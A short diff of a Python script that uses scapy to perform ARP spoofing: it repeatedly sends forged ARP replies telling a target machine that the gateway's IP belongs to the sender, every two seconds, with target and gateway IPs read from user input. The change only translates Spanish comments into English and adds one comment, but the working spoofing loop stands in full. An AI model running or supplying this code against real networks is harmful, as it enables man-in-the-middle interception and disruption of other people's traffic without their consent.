@@ -4,16 +4,17 @@ import time
 def arp_spoof(target_ip, gateway_ip, interface="eth0"):
     try:
         while True:
-            # Crear paquete ARP falsificado para la IP objetivo
+            # Building a fake ARP package
             arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, op='is-at')
-            # Enviar el paquete
+            # Send ARP fake package with scapy function
             send(arp_response, verbose=0, iface=interface)
-            # Esperar 2 segundos antes de enviar el siguiente paquete
+            # Wait 2 sec until next
             time.sleep(2)
     except KeyboardInterrupt:
         print("\nARP spoofing detenido")
 
 if __name__ == "__main__":
+    # Request target IP and Gateway(router) IP's
     target_ip = input("Ingrese la IP objetivo: ")
     gateway_ip = input("Ingrese la IP del gateway: ")
 
